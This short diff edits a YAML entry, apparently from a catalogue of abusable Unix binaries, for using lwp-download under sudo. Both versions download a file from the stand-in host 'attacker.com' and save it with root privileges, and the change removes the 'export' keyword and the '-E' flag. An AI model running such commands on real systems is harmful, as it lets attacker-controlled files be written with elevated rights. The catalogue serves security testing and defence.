@@ -14,6 +14,6 @@ functions:
   sudo:
     - code: |
         URL=http://attacker.com/file_to_get
-        export LFILE=file_to_save
-        sudo -E lwp-download $URL $LFILE
+        LFILE=file_to_save
+        sudo lwp-download $URL $LFILE
 ---
